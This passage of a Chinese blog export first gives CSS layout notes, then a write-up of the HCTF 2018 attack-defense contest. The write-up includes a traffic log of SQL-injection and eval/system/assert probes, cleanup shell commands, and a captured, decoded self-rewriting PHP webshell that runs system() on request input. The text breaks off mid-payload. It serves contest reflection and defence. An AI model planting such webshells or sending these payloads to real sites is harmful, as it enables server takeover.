默认，可以使用:link来应用样式 Visited:已经被访问过的，同理可以用:Visited伪类来应用样式 Hover：鼠标停留在链接上 Focus：被选中(如通过tab移动到这个链接)时 Active：被激活的时候(被点击)。 使用的顺序是从上到下的，因为当链接被激活的时候是选中状态的。 链接中包含图标思路和之前的将列表的原点替换成图片思路一样，引入背景图标，将背景的位置设为100% 0右上角，设置背景的大小，然后将文字右填充padding-right:设成比背景大一点即可。 demo:123456a[href*=&quot;http&quot;]&#123; background: no-repeat url(&apos;https://mdn.mozillademos.org/files/12982/external-link-52.png&apos;) 100% 0; background-size: 1rem; padding-right:1.2rem; &#125; 浮动布局让两块状元素(默认换行)并排显示(浮动效果)：float:left | right一般应用于首字下沉，或者图片被文字环绕的情景，多列浮动布局demo:123456789101112131415161718192021body &#123; width: 90%; max-width: 900px; margin: 0 auto;&#125;div:nth-of-type(1) &#123; width: 36%; float: left;&#125;div:nth-of-type(2) &#123; width: 30%; float: left; margin-left: 4%;&#125;div:nth-of-type(3) &#123; width: 26%; float: right;&#125; 清除浮动clear: left | right | both清除左|右|全部浮动，一般出现在浮动元素下方的元素需要清除。 清除浮动的另一种方法设置元素溢出时处理方案：overflow: auto; 布局：定位 绝对定位(position: absolute)设置position: absolute后，然后使用left | right | top | bottom对于其最近的一个具有定位属性的父包含块进行绝对定位(没有则选择body元素，即浏览器窗口)demo: 12345div&#123; position: absolute; left:100px; top:200px;&#125; 相对定位(position: relative)同样设置好position: relative之后，使用left|right|top|bottom相对于原来位置移动 固定定位(position: fixed)设置position: fixed，使用left|right|top|bottom，效果和绝对定位类似，他是相对于屏幕固定的，不会随着浏览器滚动条变动，也不会因为窗口的放大或缩小而动态变化。 可以给导航栏用 Relative和Absolute组合使用相对其他元素进行定位。参照定位元素:position: relative相对定位元素:position: absolute之后即可以使用left、top等熟悉进行偏移了。 重叠：z-index设置图层位置，也就是谁在上谁在下 即以z轴作参考，数值大的在上层demo:z-index:-1 弹性盒子布局继css布局工具只有float和position以来，flex实现了一些它们难以实现的功能。 flex模型说明 主轴（main axis）是沿着 flex 元素放置的方向延伸的轴（比如页面上的横向的行、纵向的列）。该轴的开始和结束被称为 main start 和 main end。 交叉轴（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为 cross start 和 cross end。 设置了 display: flex 的父元素（在本例中是 ）被称之为 flex 容器（flex container）。 在 flex 容器中表现为柔性的盒子的元素被称之为 flex 项（flex item）（本例中是 元素 设置弹性盒子display: flex 设置展示方向flex-direction: row | row-reverse | column | column-reverse 默认为row，即排列成一行，加了reverse即元素顺序倒序。 换行flex-wrap: wrap | nowrap默认值为:nowrap，即不换行demo:元素溢出时换行设置换行：flex-wrap: wrap flex-flow缩写(上述两个参数) 12flex-direction: row;flex-wrap: wrap; -&gt;flex-flow: row wrap 动态尺寸flex: &lt;number&gt;; demo:flex弹性盒子中三个article盒子宽(高)度比例为1:2:3123456789article:nth-of-type(1)&#123; flex: 1;&#125;article:nth-of-type(2)&#123; flex: 2;&#125;article:nth-of-type(3)&#123; flex: 3; &#125; demo2：还可以指定最小值，每个盒子分配完100px后，接着按比例将剩余空间分配123456789article:nth-of-type(1)&#123; flex: 1 100px;&#125;article:nth-of-type(2)&#123; flex: 2 100px;&#125;article:nth-of-type(3)&#123; flex: 3 100px;&#125; 垂直对齐 控制flex在交叉轴(纵轴)的位置align-items: stretch | center | start | endstretch：默认值，在交叉轴方向拉伸，以填充父容器，如果父容器在交叉轴没有固定的高度，则和最长的flex项高度保持一致 demo:https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items align-self: flex-start | flex-end 可以覆盖align-items的效果 demo: 123 button:first-child &#123; align-self: flex-end;&#125; 水平对齐justify-content: center | start | end | flex-start | flex-end | space-between | space-around | space-evenly等等 flex-start：从行首起始位置开始排列 start： 从主轴开始排列 space-between: 均匀排列元素，首个元素放置于起点，末尾元素放置于终点 space-around： 均匀排列每个元素，每个元素周围分配相同的空间 space-evenly; 均匀排列每个元素，每个元素之间的间隔相等 全部参数：https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content flex项排序order: &lt;number&gt;;：数值越大的在越后面 demo:将第一个按钮放最后，后边的以此往前移动123button:first-child&#123; order: 1;&#125; flex 嵌套可以为flex项目的孩子设置display:flex使之表现为flexible box 缩写语法规则：https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex flex 缩写flex: 0 0 200px; 参数1：flex-grow，该值表示和其他flex盒子成的比例关系 参数2：flex-shrink, 默认宽度大于容器时的一个收缩规则，也是比例关系。 参数3：flex-basis, 有效宽度值，即基准值。 多列布局 文本的多列布局？ 多列布局： Columnscolumns：&lt;column-width&gt; || &lt;column-count&gt;，属性值列宽和列数。demo: 200px 两列1columns: 200px 2; 列宽： column-widthcolumn-width: auto | &lt;length&gt;，可以单独使用。 列数：column-countcolumn-count：auto | &lt;integer&gt; 列间距： column-gapcolumn-gap: normal || &lt;length&gt;，默认1em，也可以用px作单位 列边框样式：column-rule 1column-rule:&lt;column-rule-width&gt;|&lt;column-rule-style&gt;|&lt;column-rule-color&gt; 和border类似，设置列边框的宽/样式/颜色demo：column-rule: 2px dotted green; 跨列设置: column-spancolumn-span:all | none， all为跨越所有列 CSS3 opacity属性设置元素的不透明级别demo: 设置div元素为透明123div&#123; opacity: 0;&#125; 0x03 元素元素分类： 块状：默认为块级元素一个占一行(从新一行开始，后面的元素另起一行)。高、宽、行高、顶和底边距可设，默认占父容器100%。使用display:block可将非块状元素转化成块状。常见元素有： 1&lt;div&gt;、&lt;p&gt;、&lt;h1&gt;...&lt;h6&gt;、&lt;ol&gt;、&lt;ul&gt;、&lt;dl&gt;、&lt;table&gt;、&lt;address&gt;、&lt;blockquote&gt; 、&lt;form&gt; 内联：和其他元素在一行上，元素高、宽度及顶和底边距不可设置，元素宽度即其包含的内容的宽度，不可改变。可以使用display: inline将非内联元素转换为内联元素。常见元素： 1&lt;a&gt;、&lt;span&gt;、&lt;br&gt;、&lt;i&gt;、&lt;em&gt;、&lt;strong&gt;、&lt;label&gt;、&lt;q&gt;、&lt;var&gt;、&lt;cite&gt;、&lt;code&gt; 内联块状： 同时具备内联元素和块状的特点，和其他元素在一行，元素边距可设置。可以使用display: inline-block转换 1&lt;img&gt;、&lt;input&gt;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2018 AWD小记]]></title>
    <url>%2F2018%2F12%2F20%2FHCTF%202018%20AWD%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[反思跑了这么远去杭州，把小组的脸都给丢尽了…这里说几个我们吃到亏吧，第一次打awd，举办方的赛制和我们之前练习的情形不太一样。可能考虑到去线下的都是老赛棍，就没有照顾到我们这样的萌新，赛制说明都没有。 直到打到后来才知道，10分钟结算一轮flag，如果被攻击的服务被check宕机了，那么这个flag是无效的。即使你在这10分钟内提交flag，他给你显示flag提交成功，但最后结算的时候是不会算上分的。被check宕机的队伍会扣除60分给没有宕机的队伍每人加10分。我们当时想着提了一堆flag打得贼带感，结果能加上的分少的可怜，第一题除了天枢和蓝莲花的师傅偶尔是正常的一轮能涨上100多分，其他队伍全程宕机，所以防守和进攻同等重要。 其次就是check相关的，我们配网络连ssh浪费了很多时间，1l 0O分不清，导致我们一上线，我们机子里就被种了一堆马。然后我们拿不到最初始的源码，回滚到第一次备份都还是很多页面都是坏的， 最后web1被check宕了2天整的。然后修洞，不要想着给全站555就能防住被传马了，这次上传点也是一个check点，在后面会结合check流量进行详细分析。 再说说运维相关的，这次我们队我负责运维的，有个比较恼火的东西就是，我们上传的洞一直没修复，因为我一直就用的555去防的，导致我们运维的时候想改一点东西，就会加上写的权限，结果种上了一堆内存马。事后去问他们，题目通过散列根据ip生成随机文件名随机密码的不死马，有一个守护进程的马，还有不断复制的马。我当时运维的时候，web1还行，web2一上线找路由规则就摸了半天，他那个是.htaccess套.htaccess的，所以我给自己目录传一个运维shell，怎么都访问不到。其次就是菜刀连不上的，我拿着burp，一条条命令手动输： team用户chmod 777 -R ./upload,给与文件夹的写权限才能删里面的文件 www-data用户：killall -u www-data，清掉不死马进程 www-data：chmod 777 -R ./upload,将马权限修改 最后再rm -rf才能删掉但是这过程因为我们没修洞.. 在用team用户给写权限的时候，一堆马又飞进来了…在这上面浪费的时间挺多的，所以得提前准备好py菜刀，提前写好这几步操作。 这次比赛，菜刀是别想了，因为临近考试，webshell的利用脚本还有bug没调试完，所以我们就只能现写各种漏洞类型的利用程序，也就仅仅种个马，读个flag就没了。还有其他的套路都没玩的上。 check流量分析事后把waf记录的流量导出来整理分析了一番，这次举办方的check可谓是十足的严格，第一天全场web宕机。还有他们还会check是否使用通防。 从流量中可以看到，web1的check流程：注册-&gt;登录-&gt;上传图片-&gt;包含图片之所以还在数据中看到一堆乱七八糟的类似payload的东西，这肯定就是主办方check通防的方法了。 所以： 千万不要用555，宁可上一个.htaccess(虽然后面还是被蓝莲花的师傅rm/覆盖了) 不要想着banip了，checkbot的ip会变几次，更何况还会被举报，check到一次扣800分… 切完不要直接删功能点，文件包含这个点，看着就是一个后门&#39;&lt;?php include($_GET[&#39;img&#39;]); ?&gt;&#39;,结果谁知道这是个check点.. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748time: ip: 192.168.233.42POST /client/user/emmm_play.class.php?emmm_cms=reg&amp;flag=ZrMlDhzjtpiKdWQnPNVyBxvw%20&apos;%20or%20select%201,2,3,4,5,(select%200xazuLSJeROvTlnChqgXmBpFckHADoKfGsbdZMPItVwirjENWQUyxY),7,8,9,10,11,12Host: 192.168.233.40:5005Content-Length: 274Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveContent-Type: application/x-www-form-urlencodedpost-data: lang=cn&amp;COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Useranswer=KvcuIkTRwz&amp;COL_Userproblem=%E4%BD%A0%E8%87%AA%E5%B7%B2%E7%9A%84%E7%94%9F%E6%97%A5%EF%BC%9F&amp;source=0&amp;ip=127.0.0.1&amp;COL_Userpass2=123456&amp;COL_Userpass=123456&amp;introducer=&amp;Submit=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8Ctime: ip: 192.168.233.42POST /client/user/emmm_play.class.php?emmm_cms=login&amp;flag=edruHEyhIcsMPivmpoWxlzNjVYCFgLwSaAGDbnkt%20&apos;%20&amp;&amp;%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,(select%200xeYKCTRrMpmofFqEsdNhnZlcXDiUVSbxgzHyGuQJtIBWjvLPwkaOA)Host: 192.168.233.40:5005Content-Length: 87Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveCookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqkContent-Type: application/x-www-form-urlencodedpost-data: COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Userpass=123456&amp;Submit=%E7%99%BB%E5%BD%95time: ip: 192.168.233.42POST //client/user/emmm_play.class.php?emmm_cms=edit&amp;lang=cnHost: 192.168.233.40:5005Content-Length: 79075Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveCookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqkContent-Type: multipart/form-data; boundary=ad7bceb5053a4b3ca22cd26f34b77a19time: ip: 192.168.233.42GET /client/user/index.php?img=../../skin/HcSLetgnrb.pngHost: 192.168.233.40:5005Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0 day2-web1:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151162018/12/16 02:32:10GET /check?cmd=sdhABbfUTgCuIWqSnvXRjYLM.move_file(AOFyfsqBgVeoTdKtMSICEjaGbRUHL.base64_decode(file_get_content(VMZthpbqiuzURmGCDEwFHyadSPrNeWxnQsYkKXcgJAjoTlBIOvfL).zGgOeoBqwVrIjayQLUWbDinvh).SFhuxlvKbWkUwMYE HTTP/1.1IP：192.168.22.243HOST：192.168.117.100:9009:9009USER_AGENT：COOKIE：REFERER：2018/12/16 02:37:02GET /check?cmd=MxyLYmfRiUWuqIFCVowJrOSATEgtHs &apos; &amp;&amp; select 1,2,3,4 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：REFERER：2018/12/16 02:37:02GET /?cmd=YfLvGKAnQNebwqpPijUu &apos; or select 1,2,3,4,5,6,7,8,9,10,11,12,(select 0xyUpKDhLVwfBtFivxAbZqEjXCQdJYMaGlozIHPnuekOcNmsgWR),14,15,16,17,18,19,20,21,22,23,24,25 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：REFERER：2018/12/16 02:37:02GET /users/register?cmd=irTekycoKIWSRCsfUqxBAgapl.substr(NhaVIUPfvOmuAjDgrsXJSKMixYyBZo.readdir(VnAGsifbEUZzjCw.move_file(DivqLWumQORGaTkJrC.readdir(base64_decode(fporTBYmQdAHxyuRXcIEnDFhGOkzMbLaWwNVetUvqjZPgClJKSsi).LEwjPvQxCKFOA).TEivOpdPRkrcouhzVKbeIaFUGH).OMVWBXdxNPGgAeLhS).pdrcXqohZFHW) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/register?cmd=xRVrcDLSZMUPpbXjsBiOz &apos; union select 1,2,3,4,5,6,7,(select 0xXctOkvxodFyfGUuTDgblraRziAVSYKsQJHemEjZhwPWnLICNBMqp),9,10,11,12,13,14,15 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：username=ecCNkO&amp;confirm_password=kaljXLRHtU&amp;password=kaljXLRHtU2018/12/16 02:37:02GET /users/login HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：2018/12/16 02:37:02GET /users/login?cmd=bcjusDLfkrpMTwHeloSWZgqAd.file_put_contents(fhHiInvDELpKeJ.readdir(NFvnqgXMJHDE.glob(mtCEkDWycgzqnQVLaJPiZS.assert(ytvJChwoYe.fread(file_put_contents(GwLUrvORJmIPfYjVcMAuCtzBSThHZqXKb).hnrjIwBUuPexykfiWqc).HBSQthcujMYWDFPUkaAVgbivTsnN).KYsLfDbFHW).HGTMvLBkRgDmVKIso).RbIkdCSDoErKHYFqatGNjsWh) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/login?cmd=GLpMuASfsPFWiXc.fread(CBMwgWxDbtcFPjAmNnXUVovKpieaLY.fread(mzuYHcTVvraCJhXR.dirname(lwzeLcmxMbTUoXgsABfYiJ.system(zHaZomhUABCrlWPykdqbIiD.eval(system(CxrWZSDBOknpjNweauXYdAgvoPzHQJRsbGcfVtElFMyIKThUqimL).jBqTLeChVQsDxmRtIZWbgki).yMqBZgcwzXjblrAYfEUICQThnD).GkovubFLynSrixIcpJgqR).OSyBnrvoWeXuIPNpEGsARZzJ).hsjweqlXxPrDROkMEibS) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：username=ecCNkO&amp;password=kaljXLRHtU2018/12/16 02:37:02GET /users HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/editprofit?cmd=YzOLfeHKbVjZyhcwonRXtJvTpSEIu.glob(maOUqAfuQhYM.file_get_content(KrzfMtSDuExbLX.move_file(readdir(gKUYOAHyNewQkRnoJfMXBmzpjTiaGdshcCEtFbrqxVWDIvSuPLlZ).TuPQJlhNjUYARoKIDEtCsaWcLBx).vikIXSEDftUW).fPzAivYRQEcIKCXrnNs) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：username=QwLryC&amp;email=vESrMpul%40OlZDs2018/12/16 02:37:02GET /users HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/editAvatar?cmd=XJqDYlazVZAxwtmNFnIyiQkGSvPcKOHoRfEWT &apos; and select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,(select 0xCUJzbVPHQLMpGZxaBDRSFdfhgcWEkryqiswlvjnTutmIAYKNXeoO),30,31,32,33,34,35 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：POST /users?cmd=OYhzfowNAdGcvpRWsUbCXqIn.dirname(ZxtIKuPJprHCifgvGLQDmTeWjEnRsd.assert(qAxgrvhSiK.move_file(UTpIhfOkulKaxSoQjzwLmHZeYtr.substr(JimRENYeHZ.dirname(assert(fldrzeIkncKqORGVTiEtuFhoNwpJAPxSyUBDCLmZvXHWQMagsjYb).mzLflHhTvrCGyjPSnNU).PuvwmptyQRWn).UcrCmvYgKjAFiXEVuIeGw).wBJClAQUGr).puUhczOWfMJQSxIyqXLEGAwnNCKDRZ) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER： 沟通虽然不限制外网，但是网线和wifi切换起来还是很麻烦而且时效性也是个问题。我们在队内用飞鸽传书这个内网聊天程序来解决的。也尝试了双网卡，但是还是有一点小问题。 师傅们的shell 默小西师傅的shell：moxiaoxi ip:192.168.13.134 他的shell同时还进行了内容检测。其实也可以破，我们清马的时候，记一下文件名，然后清完之后，给他上一个同名文件记录流量，就知道他密码了，然后搭一波顺风车~ 123456789101112131415161718192021222324252627282930system(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);base64:$path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX);$code_template的base64解码&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt; $shell 解base64：&lt;?phpif(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)&#123; @system($_REQUEST[&quot;moxiaoxi666&quot;]);&#125;?&gt; 2： 1234567891011121314151617181920212223242526272829303132333435363738394041424344system%28%27%2Fbin%2Fecho+mo123%3B%2Fbin%2Fecho+JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fhome%2Fteam%2Fworkdir%2F%2F.4b22331ce86c8caa0adc37039326d5fc.php%3B%2Fbin%2Fecho+xiaoxi456890%27%29%3B// url decodesystem(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// base64 decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVl